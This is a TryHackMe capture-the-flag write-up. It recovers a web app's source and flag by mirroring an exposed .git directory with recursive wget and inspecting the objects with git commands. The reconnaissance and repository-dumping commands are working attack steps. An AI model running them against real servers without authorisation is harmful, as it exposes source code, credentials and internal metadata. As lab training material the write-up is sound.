# Room 404 - TryHackMe

Web target with directory listing enabled and an exposed `.git` folder on the webroot. The
entire source repository can be pulled down without any authentication, and the flag sits
in plaintext inside a committed file.

Target: `10.64.157.196`

---

## Reconnaissance

```bash
nmap -sC -sV 10.64.157.196
```

Two open ports:

- SSH (22)
- HTTP (8080) - custom port, hosting "Byte Lotus - Guest Experience Platform"

---

## Enumeration

Directory listing is enabled on the web server. Browsing to `/.git/objects/` shows the
whole folder instead of a 403:

```
http://10.64.157.196:8080/.git/objects/
```

```
0a/  0f/  25/  a5/  fa/  info/  pack/
```

An exposed `.git` folder means the full source code and commit history can be downloaded,
not just what's rendered on the page.

---

## Exploitation - Dumping the Repository

Since directory listing is on, a plain recursive `wget` is enough - no need for a tool like
`git-dumper`:

```bash
mkdir room404 && cd room404
wget -r -np -nH -R "index.html*" http://10.64.157.196:8080/.git/
```

- `-r` recursive download
- `-np` stay inside `/.git/`, don't go up
- `-nH` skip creating a host-named folder
- `-R "index.html*"` skip the auto-generated listing pages

This pulls down 46 files: all five loose objects plus the refs.

With the `.git` folder local, `git cat-file` maps the whole repository in one command:

```bash
git cat-file --batch-all-objects --batch-check
```

```
0a12caa4e52a965e89e5eccf5760924b21aacbf7 blob 2554
0f13550b4cb13e9f30c61d5b342c532d21e45bda commit 208
2575ab073f67615a27135663ed36794c2d2584fb blob 263
a5965c580fee91d852e5b19a8290da02d2926523 blob 238
fa45dbd69394ea9e13683d9efb6a0220daac59d4 tree 109
```

One commit, one tree, three blobs - a tiny repo. Reading the tree shows the file names:

```bash
git cat-file -p fa45dbd69394ea9e13683d9efb6a0220daac59d4
```

```
100644 blob a5965c580fee91d852e5b19a8290da02d2926523	README.md
100644 blob 2575ab073f67615a27135663ed36794c2d2584fb	app.js
100644 blob 0a12caa4e52a965e89e5eccf5760924b21aacbf7	index.html
```

Three static files - no Flask, no `requirements.txt`, nothing server-side in the repo.

```bash
git reset --hard HEAD
```

This rebuilds the working tree from the objects, so the files can just be read instead of
decoding each blob by hand.

---

## Getting the Flag

`README.md` is an internal staging note. It warns not to deploy this folder to production,
and has the flag sitting in plaintext under a line reading "Staging flag (remove before
launch)".

`app.js` also reveals an API path, `/api/guest`, pointing to a separate personalization
service that isn't part of this repository.

---

## Along the Way

The room's name and theme pointed toward a Werkzeug/Flask debug RCE, but there was no
Werkzeug banner and no Flask anywhere in the recovered repository - ruled out by the source
itself rather than by trial and error.

The reflog (`.git/logs/HEAD`) was also worth a look before the dump. It lists the committer
as `night-shift <dev@byte-lotus.internal>` - a real username and internal domain, leaked
straight from git metadata and independent of the flag.

---

## Key Takeaways

- An exposed `.git` folder means the full source and commit history are downloadable, not
  just whatever the flag happens to be.
- With directory listing enabled, `wget -r -np -nH` dumps it directly. Without listing,
  `git-dumper` does the same job by following refs instead of browsing folders.
- `git cat-file --batch-all-objects --batch-check` maps every object in one command instead
  of reading files one by one.
- Reflog and committer metadata can leak usernames, emails, and internal hostnames even when
  the code itself has nothing sensitive in it.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were
performed strictly for educational purposes.
